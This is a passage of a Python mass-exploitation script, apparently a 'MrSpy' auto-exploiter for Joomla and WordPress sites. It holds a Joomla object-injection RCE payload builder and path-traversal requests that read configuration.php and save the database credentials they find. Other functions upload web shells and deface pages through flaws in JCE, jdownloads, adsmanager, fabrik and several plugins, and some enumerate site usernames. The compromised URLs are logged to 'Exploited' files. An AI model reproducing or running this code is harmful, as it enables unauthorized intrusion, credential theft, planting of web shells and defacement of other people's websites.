                        elif 'Vuln!!' in IndexCheck2.text:
                            self.Print_Vuln_index(site + '/images/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write('http://' + site + '/images/vuln.htm' + '\n')
                    else:
                        self.Print_NotVuln('RCE Joomla', site)
                else:
                    self.Print_NotVuln('RCE Joomla', site)
            except:
                self.Print_NotVuln('RCE Joomla', site)
        except:
            self.Print_NotVuln('RCE Joomla', site)

    def php_str_noquotes(self, data):
        try:
            encoded = ""
            for char in data:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]
        except:
            pass

    def generate_payload(self, php_payload):
        try:
            php_payload = "eval({0})".format(php_payload)
            terminate = '\xf0\xfd\xfd\xfd';
            exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory"
            :0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"J
            DatabaseDriverMysql":0:{}s:8:"feed_url";'''
            injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
            exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
            exploit_template += r''';s:19:"cache_name_function";s:6:
            "assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatab
            aseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connec
            tion";b:1;}''' + terminate
            return exploit_template
        except:
            pass
    def joomver(self,site):
        try:
            zz=requests.get('http://'+site+'/language/en-GB/en-GB.xml')
            req=re.findall('<version>(.*)<',zz)[0]
            print "\t{>} Version : %s"%(req)
        except:
            pass
    def wpmver(self,site):
        try:
            zz=requests.get('http://'+site)
            req=re.findall('content="WordPress (.*?)',zz)[0]
            print "\t{>} Version : %s"%(req)
        except:
            pass

    def Joomla_TakeADmin(self, site):
        try:
            self.Print_NotVuln('Failed 3.x', site)
        except:
            self.Print_NotVuln('Maybe Add Admin 3.x', site)

    def Com_s5_media_player(self, site):
        try:
            Exp = 'http://' + site + \
                  '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'JConfig' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text)
                    Getuser = re.findall("user = '(.*)';", GetConfig.text)
                    Getpass = re.findall("password = '(.*)';", GetConfig.text)
                    Getdb = re.findall("db = '(.*)';", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    pass
            else:
                self.Print_NotVuln('Com_s5_media_player', site)
        except:
            self.Print_NotVuln('Com_s5_media_player', site)

    def Com_Hdflvplayer(self, site):
        try:
            Exp = 'http://' + site + \
                  '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'JConfig' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text)
                    Getuser = re.findall("user = '(.*)';", GetConfig.text)
                    Getpass = re.findall("password = '(.*)';", GetConfig.text)
                    Getdb = re.findall("db = '(.*)';", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    pass
            else:
                self.Print_NotVuln('Com_Hdflvplayer', site)
        except:
            self.Print_NotVuln('Com_Hdflvplayer', site)

    def Com_Joomanager(self, site):
        try:
            Exp = 'http://' + site + \
                  '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'JConfig' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text)
                    Getuser = re.findall("user = '(.*)';", GetConfig.text)
                    Getpass = re.findall("password = '(.*)';", GetConfig.text)
                    Getdb = re.findall("db = '(.*)';", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Com_Joomanager', site)
            else:
                self.Print_NotVuln('Com_Joomanager', site)
        except:
            self.Print_NotVuln('Com_Joomanager', site)


    def Com_Macgallery(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'JConfig' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text)
                    Getuser = re.findall("user = '(.*)';", GetConfig.text)
                    Getpass = re.findall("password = '(.*)';", GetConfig.text)
                    Getdb = re.findall("db = '(.*)';", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Com_Macgallery', site)
            else:
                self.Print_NotVuln('Com_Macgallery', site)
        except:
            self.Print_NotVuln('Com_Macgallery', site)


    def Com_CCkJseblod(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_cckjseblod&task=download&file=configuration.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'JConfig' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text)
                    Getuser = re.findall("user = '(.*)';", GetConfig.text)
                    Getpass = re.findall("password = '(.*)';", GetConfig.text)
                    Getdb = re.findall("db = '(.*)';", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Com_CCkjseblod', site)
            else:
                self.Print_NotVuln('Com_CCkjseblod', site)
        except:
            self.Print_NotVuln('Com_CCkjseblod', site)


    def Com_MyBlog(self, site):
        try:
            fileindex = {'fileToUpload': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/index.php?option=com_myblog&task=ajaxupload'
            GoT = requests.post(Exp, files=fileindex, timeout=5, headers=self.Headers)
            if 'success' or 'File exists' in GoT.text:
                if '/images/pwn' in GoT.text:
                    IndeXpath = 'http://' + site + '/images/pwn.gif'
                else:
                    try:
                        GetPAth = re.findall("source: '(.*)'", GoT.text)
                        IndeXpath = GetPAth[0]
                    except:
                        IndeXpath = 'http://' + site + '/images/pwn.gif'
                CheckIndex = requests.get(IndeXpath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/images/pwn.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndeXpath + '\n')
                else:
                    self.Print_NotVuln('Com_MyBlog', site)
            else:
                self.Print_NotVuln('Com_MyBlog', site)
        except:
            self.Print_NotVuln('Com_MyBlog', site)


    def Com_Jdownloads_shell(self, site):
        try:
            fileindex = {'file_upload': (self.ZipJd, open(self.ZipJd, 'rb'), 'multipart/form-data'),
                         'pic_upload': (self.jdShell, open(self.jdShell, 'rb'), 'multipart/form-data')}
            post_data = {
                'name': 'spy',
                'mail': 'moetazbusiness@gmail.com',
                'catlist': '1',
                'filetitle': "lolz",
                'description': "<p>zot</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
                'option': "com_jdownloads",
                'view': "upload"
            }
            Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
            Got = requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            if '/upload_ok.png' in Got.text:
                checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + self.jdShell.split('/')[1]
                Check = requests.get(checkUrl, timeout=5, headers=self.Headers)
                if 'MisterSpyVulbv7' in Check.text:
                    ChecksHell = requests.get('http://' + site + '/images/vuln.php', timeout=5, headers=self.Headers)
                    CheckIndex = requests.get('http://' + site + '/vuln.html', timeout=5, headers=self.Headers)
                    if 'SpyUploaderV1' in ChecksHell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.html')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.html' + '\n')
                    else:
                        self.Com_Jdownloads(site)
                else:
                    self.Com_Jdownloads(site)
            else:
                self.Com_Jdownloads(site)
        except:
            self.Com_Jdownloads(site)


    def Com_Jdownloads(self, site):
        try:
            fileindex = {'file_upload': (self.ZipJd, open(self.ZipJd, 'rb'), 'multipart/form-data'),
                         'pic_upload': (self.Jce_Deface_image, open(self.Jce_Deface_image, 'rb'), 'multipart/form-data')}
            post_data = {
                'name': 'MrSpy',
                'mail': 'moetazbusiness@gmail.com',
                'catlist': '1',
                'filetitle': "lolz",
                'description': "<p>zot</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': "<p>Hacked</p>",
                'option': "com_jdownloads",
                'view': "upload"
            }
            Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
            Got = requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            if '/upload_ok.png' in Got.text:
                checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + self.Jce_Deface_image.split('/')[1]
                Check = requests.get(checkUrl, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Check.text:
                    self.Print_Vuln_index(site + '/images/jdownloads/screenshots/' +
                                          self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(checkUrl + '\n')
                else:
                    self.Print_NotVuln('Com_Jdownloads', site)
            else:
                self.Print_NotVuln('Com_Jdownloads', site)
        except:
            self.Print_NotVuln('Com_Jdownloads', site)


    def Com_Fabric(self, site):
        try:
            fileindex = {'userfile': (self.TextindeX, open(self.TextindeX, 'rb'), 'multipart/form-data')}
            post_data = {
                "name": "me.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }
            Exp = 'http://' + site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
            requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            Check = requests.get('http://' + site + '/media/' + self.TextindeX.split('/')[1], headers=self.Headers,
                                 timeout=10)
            if 'spy0xProjectTop50' in Check.text:
                self.Print_Vuln_index(site + '/media/' + self.TextindeX.split('/')[1])
                with open('Exploited/Index.txt', 'a') as writer:
                    writer.write(site + '/media/' + self.TextindeX.split('/')[1] + '\n')
            else:
                self.Print_NotVuln('Com_Fabric', site)
        except:
            self.Print_NotVuln('Com_Fabric', site)


    def Com_AdsManager(self, site):
        try:
            fileindex = {'file': open(self.Jce_Deface_image, 'rb')}
            post_data = {"name": self.Jce_Deface_image.split('/')[1]}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            if '"jsonrpc"' in GoT.text:
                Check = requests.get('http://' + site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1],
                                     timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Check.text:
                    self.Print_Vuln_index(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_AdsManager', site)
        except:
            self.Print_NotVuln('Com_AdsManager', site)

    def Com_AdsManager_Shell(self, site):
        try:
            fileindex = {'file': open(self.indeX, 'rb')}
            post_data = {"name": "vuln.php"}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            if '"jsonrpc"' in GoT.text:
                requests.post(Exp, files=fileindex, data={"name": "vuln.phP"}, timeout=5, headers=self.Headers)
                requests.post(Exp, files=fileindex, data={"name": "vuln.phtml"}, timeout=5, headers=self.Headers)
                Check = requests.get('http://' + site + '/tmp/plupload/vuln.php', timeout=5, headers=self.Headers)
                Check2 = requests.get('http://' + site + '/tmp/plupload/vuln.phP', timeout=5, headers=self.Headers)
                Check3 = requests.get('http://' + site + '/tmp/plupload/vuln.phtml', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                CheckShell = requests.get('http://' + site + '/images/vuln.php', timeout=5, headers=self.Headers)

                if 'MrSpyUp!!' in Check.text:
                    if 'SpyUploaderV1' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Com_AdsManager(site)
                elif 'MrSpyUp!!' in Check2.text:
                    if 'SpyUploaderV1' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Com_AdsManager(site)
                elif 'MrSpyUp!!' in Check3.text:
                    if 'SpyUploaderV1' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Com_AdsManager(site)
                else:
                    self.Com_AdsManager(site)
        except:
            self.Com_AdsManager(site)

    def JCE_shell(self, site):
        try:
            fileShell = {'Filedata': open(self._shell, 'rb')}
            post_data = {'upload-dir': '/', 'upload-overwrite': '0', 'action': 'upload'}
            Exp = 'http://' + site +\
                  '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
            Post = requests.post(Exp, files=fileShell, data=post_data, timeout=5)
            OtherMethod = '"text":"' + self._shell.split('/')[1] + '"'
            if OtherMethod in Post.text.encode('utf-8'):
                PrivMethod = {'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + self._shell.split('/')[1]
                                      + "\",\"./../../images/vuln.php\"]}"}
                try:
                    privExploit = 'http://' + site + '/index.php?option=com_jce&task=' \
                                                         'plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
                    requests.post(privExploit, data=PrivMethod, timeout=5)
                    try:
                        VulnCheck = requests.get('http://' + site + '/images/vuln.php', timeout=5)
                        if 'MisterSpyv7up' in VulnCheck.text:
                            self.Print_vuln_Shell(site + '/images/vuln.php')
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(site + '/images/vuln.php' + '\n')
                            self.Jce_Test(site)
                        else:
                            self.Jce_Test(site)
                    except:
                        self.Jce_Test(site)
                except:
                    self.Jce_Test(site)

            else:
                self.Jce_Test(site)
        except:
            self.Jce_Test(site)

    def Jce_Test(self, site):
        try:
            fileDeface = {'Filedata': open(self.Jce_Deface_image, 'rb')}
            post_data = {'upload-dir': '../../', 'upload-overwrite': '0', 'action': 'upload'}
            Exp = 'http://' + site +\
                  '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
            Post = requests.post(Exp, files=fileDeface, data=post_data, timeout=5)
            OtherMethod = '"text":"' + self.Jce_Deface_image.split('/')[1] + '"'
            if OtherMethod in Post.text.encode('utf-8'):
                self.Print_Vuln_index(site + '/' + self.Jce_Deface_image.split('/')[1])
                with open('Exploited/Index.txt', 'a') as writer:
                    writer.write(site + '/' + self.Jce_Deface_image.split('/')[1] + '\n')
            elif OtherMethod not in Post.text.encode('utf-8'):
                post_data2 = {'upload-dir': '../', 'upload-overwrite': '0', 'action': 'upload'}
                Post = requests.post(Exp, files=fileDeface, data=post_data2, timeout=5)
                if OtherMethod in Post.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/images/' + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/images/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_JCE', site)
            else:
                self.Print_NotVuln('Com_JCE', site)
        except:
            self.Print_NotVuln('Com_JCE', site)


    def alberghiExploit(self, site):
        try:
            fileDeface = {'userfile': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/administrator/components/com_alberghi/upload.alberghi.php'
            Check = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'class="inputbox" name="userfile"' in Check.text:
                Post = requests.post(Exp, files=fileDeface, timeout=5, headers=self.Headers)
                if 'has been successfully' or 'already exists' in Post.text:
                    CheckIndex = requests.get(site + '/administrator/components/com_alberghi/' +
                                     self.Jce_Deface_image.split('/')[1], timeout=5, headers=self.Headers)
                    if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/administrator/components/com_alberghi/' +
                                         self.Jce_Deface_image.split('/')[1] + '\n')
                        self.Print_Vuln_index(site + '/administrator/components/com_alberghi/' +
                                              self.Jce_Deface_image.split('/')[1])
                    else:
                        self.Print_NotVuln('com_alberghi', site)
                else:
                    self.Print_NotVuln('com_alberghi', site)
            else:
                self.Print_NotVuln('com_alberghi', site)
        except:
            self.Print_NotVuln('com_alberghi', site)
			
			
			


    def UserName_Enumeration(self, site):
        _cun = 1
        Flag = True
        __Check2 = requests.get('http://' + self.url + '/?author=1', timeout=10)
        try:
            while Flag:
                GG = requests.get('http://' + self.url + '/wp-json/wp/v2/users/' + str(_cun), timeout=5)
                __InFo = json.loads(GG.text)
                if 'id' not in __InFo:
                    Flag = False
                else:
                    Usernamez = __InFo['name']
                    print r + '    [' + y + '+' + r + ']' + w + ' Wordpress Username: ' + m + Usernamez
                _cun = _cun + 1
        except:
            try:
                if '/author/' not in __Check2.text:
                    print r + '    [' + y + '+' + r + ']' + w + ' Wordpress Username: ' + r + 'Not FOund'
                else:
                    find = re.findall('/author/(.*)/"', __Check2.text)
                    username = find[0].strip()
                    if '/feed' in username:
                        find = re.findall('/author/(.*)/feed/"', __Check2.text)
                        username2 = find[0].strip()
                        print r + '    [' + y + '+' + r + ']' + w + ' Wordpress Username: ' + m + username2
                    else:
                        print r + '    [' + y + '+' + r + ']' + w + ' Wordpress Username: ' + m + username

            except requests.exceptions.ReadTimeout:
                self.cls()
                self.print_logo()
                print y + '---------------------------------------------------'
                print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                      ' ConnectionError! Maybe server Down, Or your ip blocked! ' + y + ']'

    def CpaNel_UserName_Enumeration(self, site):
        try:
            Get_page = requests.get('http://' + self.url, timeout=10)
            if '/wp-content/' in Get_page.text:
                Hunt_path = requests.get('http://' + self.url + '/wp-includes/ID3/module.audio.ac3.php', timeout=10)

                def Hunt_Path_User():
                    try:
                        find = re.findall('/home/(.*)/public_html/wp-includes/ID3/module.audio.ac3.php', Hunt_path.text)
                        x = find[0].strip()
                        return x
                    except:
                        pass

                def Hunt_Path_Host():
                    try:
                        find = re.findall("not found in <b>(.*)wp-includes/ID3/module.audio.ac3.php", Hunt_path.text)
                        x = find[0].strip()
                        return x
                    except:
                        pass

                Cpanel_username = Hunt_Path_User()
                Path_Host = Hunt_Path_Host()
                if Cpanel_username == None:
                    print r + '    [' + y + '+' + r + ']' + w + ' Cpanel Username: ' + r + 'Not FOund'

                else:
                    print r + '    [' + y + '+' + r + ']' + w + ' Cpanel Username: ' + m + Cpanel_username

                if Path_Host == None:
                    print r + '    [' + y + '+' + r + ']' + w + ' User Path Host : ' + r + 'Not FOund'
                else:
                    print r + '    [' + y + '+' + r + ']' + w + ' User Path Host : ' + m + Path_Host

        except requests.exceptions.ReadTimeout:
            self.cls()
            self.print_logo()
            print y + '---------------------------------------------------'
            print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                  ' ConnectionError! Maybe server Down, Or your ip blocked! ' + y + ']'

    def Plugin_NamE_Vuln_TeST(self, Plugin_NaME):
        num = 1
        cal = 0
        Flag = True
        while Flag:
            if Plugin_NaME == 'revslider':
                Plugin_NaME = 'Slider Revolution'
            url = 'https://wpvulndb.com/searches?page=' + str(num) + '&text={}&vuln_type='.format(Plugin_NaME)
            aa = requests.get(url, timeout=5)
            if 'No results found.' in aa.text:
                Flag = False
                break
            else:
                az = re.findall('<td><a href="/vulnerabilities/(.*)">', aa.text)
                bb = (len(az) / 2)
                for x in range(int(bb)):
                    uz = 'www.wpvulndb.com/vulnerabilities/' + str(az[cal])
                    Get_title = requests.get('http://' + uz, timeout=5)
                    Title = re.findall('<title>(.*)</title>', Get_title.text.encode('utf-8'))
                    print r + '        [' + y + 'MayBe Vuln' + r + '] ' + w + uz + ' --- ' + r + \
                          Title[0].encode('utf-8').split('-')[0]
                    cal = cal + 2
                cal = 0
                num = num + 1

    def Version_Wp(self, site):
        try:
            Check_oNe = requests.get('http://' + self.url + '/readme.html', timeout=10)
            find = re.findall('Version (.+)', Check_oNe.text)
            try:
                version = find[0].strip()
                if len(version) != None:
                    print r + '    [' + y + '+' + r + ']' + w + ' Wp Version: ' + m + version
                    self.Plugin_NamE_Vuln_TeST('Wordpress ' + version)
            except:
                print r + '    [' + y + '+' + r + ']' + w + ' Wp Version: ' + r + 'Not Found'

        except requests.exceptions.ReadTimeout:
            self.cls()
            self.print_logo()
            print y + '---------------------------------------------------'
            print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                  ' ConnectionError! Maybe server Down, Or your ip blocked! ' + y + ']'

    def GeT_PluGin_Name(self, site):
        plugin_NamEz = {}
        Dup_Remove_Plug = 'iran-cyber.net'
        a = re.findall('/wp-content/plugins/(.*)', self.CheckWordpress.text)
        s = 0
        bb = len(a)
        for x in range(int(bb)):
            name = a[s].split('/')[0]
            if '?ver=' in a[s]:
                verz = a[s].split('?ver=')[1]
                version = re.findall('([0-9].[0-9].[0-9])', verz)
                if len(version) ==0:
                    if '-' in str(name):
                        g = name.replace('-', ' ')
                        plugin_NamEz[g] = s
                    elif '_' in str(name):
                        h = name.replace('_', ' ')
                        plugin_NamEz[h] = s
                    else:
                        plugin_NamEz[name] = s
                else:
                    OK_Ver = name + ' ' + version[0]
                    Dup_Remove_Plug = name
                    if '-' in OK_Ver:
                        ff = OK_Ver.replace('-', ' ')
                        plugin_NamEz[ff] = s
                    elif '_' in OK_Ver:
                        ff = OK_Ver.replace('_', ' ')
                        plugin_NamEz[ff] = s
                    else:
                        plugin_NamEz[OK_Ver] = s
            else:
                if Dup_Remove_Plug in name:
                    pass
                else:
                    if '-' in str(name):
                        g = name.replace('-', ' ')
                        plugin_NamEz[g] = s
                    elif '_' in str(name):
                        h = name.replace('_', ' ')
                        plugin_NamEz[h] = s
                    else:
                        plugin_NamEz[name] = s
            s = s + 1
        for name_plugins in plugin_NamEz:
            try:
                plugname = str(name_plugins).split(' ')[0]
            except:
                plugname = str(name_plugins)
            print r + '    [' + y + '+' + r + ']' + w + ' Plugin Name: ' + m + name_plugins
            self.Plugin_NamE_Vuln_TeST(name_plugins)

    def GeT_Theme_Name(self, site):
        a = re.findall('/wp-content/themes/(.*)', self.CheckWordpress.text)
        Name_Theme = a[0].split('/')[0]
        if '?ver=' in a[0]:
            verz = a[0].split('?ver=')[1]
            version = re.findall('([0-9].[0-9].[0-9])', verz)
            try:
                OK_Ver = Name_Theme + ' ' + version[0]
            except:
                OK_Ver = Name_Theme
            if '-' in OK_Ver:
                x2 = OK_Ver.replace('-', ' ')
                print r + '    [' + y + '+' + r + ']' + w + ' Themes Name: ' + m + x2
                self.Plugin_NamE_Vuln_TeST(x2)
            elif '_' in OK_Ver:
                x = OK_Ver.replace('_', ' ')
                print r + '    [' + y + '+' + r + ']' + w + ' Themes Name: ' + m + x
                self.Plugin_NamE_Vuln_TeST(x)
            else:
                print r + '    [' + y + '+' + r + ']' + w + ' Themes Name: ' + m + OK_Ver
                self.Plugin_NamE_Vuln_TeST(OK_Ver)
        else:
            if '-' in Name_Theme:
                x2 = Name_Theme.replace('-', ' ')
                print r + '    [' + y + '+' + r + ']' + w + ' Themes Name: ' + m + x2
                self.Plugin_NamE_Vuln_TeST(x2)
            elif '_' in Name_Theme:
                x = Name_Theme.replace('_', ' ')
                print r + '    [' + y + '+' + r + ']' + w + ' Themes Name: ' + m + x
                self.Plugin_NamE_Vuln_TeST(x)
            else:
                print r + '    [' + y + '+' + r + ']' + w + ' Themes Name: ' + m + Name_Theme
                self.Plugin_NamE_Vuln_TeST(Name_Theme)			
						
			

    def CateGory_page_icons(self, site):
        try:
            ChckVln = requests.get('http://' + site + '/wp-content/plugins/category-page-icons/css/menu.css',
                                   timeout=5, headers=self.Headers)
            if ChckVln.status_code == 200:
                Exp = 'http://' + site + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php'
                fileDeface = {'wpdev-async-upload': open(self.Jce_Deface_image, 'rb')}
                PostDAta = {'dir_icons': '../../../',
                            'submit': 'upload'}
                requests.post(Exp, files=fileDeface, data=PostDAta, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/wp-content/' + self.Jce_Deface_image.split('/')[1],
                                          timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/wp-content/' + self.Jce_Deface_image.split('/')[1] + '\n')
                    self.Print_Vuln_index(site + '/wp-content/' + self.Jce_Deface_image.split('/')[1])
                else:
                    self.Print_NotVuln('CateGory_page_icons', site)
            else:
                self.Print_NotVuln('CateGory_page_icons', site)
        except:
            self.Print_NotVuln('CateGory_page_icons', site)


    def Downloads_Manager(self, site):
        try:
            Checkvuln = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/img/unlock.gif',
                                     timeout=5, headers=self.Headers)
            if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Checkvuln.text:
                PostDAta = {'dm_upload': ''}
                fileDeface = {'upfile': open(self.Jce_Deface_image, 'rb')}
                fileShell = {'upfile': open(self.pagelinesExploitShell, 'rb')}
                requests.post('http://' + site, data=PostDAta, files=fileDeface, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                          self.Jce_Deface_image.split('/')[1])
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    requests.post('http://' + site, data=PostDAta, files=fileShell, timeout=5, headers=self.Headers)
                    requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                 self.pagelinesExploitShell.split('/')[1], timeout=5, headers=self.Headers)
                    CheckShell = requests.get('http://' + site + '/wp-content/vuln.php',
                                              timeout=5, headers=self.Headers)
                    if 'MrSpyUp!!' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.pagelinesExploitShell.split('/')[1])
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.pagelinesExploitShell.split('/')[1] + '\n')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
